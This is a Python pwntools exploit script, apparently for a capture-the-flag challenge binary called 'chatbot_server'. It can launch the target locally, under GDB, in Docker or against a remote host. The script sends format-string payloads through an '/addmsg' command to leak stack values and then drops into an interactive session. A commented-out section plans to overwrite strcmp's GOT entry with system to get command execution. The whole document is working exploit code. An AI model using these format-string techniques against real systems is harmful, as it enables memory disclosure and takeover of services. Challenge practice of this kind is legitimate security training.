#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *

exe = context.binary = ELF('chatbot_server')
context.terminal = ['xfce4-terminal', '--title=GDB-Pwn', '--zoom=0', '--geometry=128x50+1100+0', '-e']
context.log_level = 'debug'

def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE: 
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    elif args.DOCKER:
        p = remote("localhost", 1337)
        time.sleep(1)
        pid = process(["pgrep", "-fx", "/home/app/chall"]).recvall().strip().decode()
        gdb.attach(int(pid), gdbscript=gdbscript, exe=exe.path)
        return p
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
init-pwndbg
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

def init():
    global io

    io = start()

def generate(pos):
    # offset = pos
    # write = {
    #     exe.got["strcmp"]: exe.plt["system"]
    # }
    # payload = fmtstr_payload(offset, write, write_size='short')
    # return payload
    payload = "A"*8 + f"%{pos}$p"
    return payload.ljust(128, ".")

def solve():

    pos = 152-(8*6)
    inc = 0x10

    for _ in range(10):
        payload = generate(pos)
        cmd = f"/addmsg {payload}".encode()
        pos += inc
        io.send(cmd)
    
    for _ in range(10):
        io.sendline("lol")

    io.interactive()


def main():
    
    init()
    solve()
    

if __name__ == '__main__':
    main()

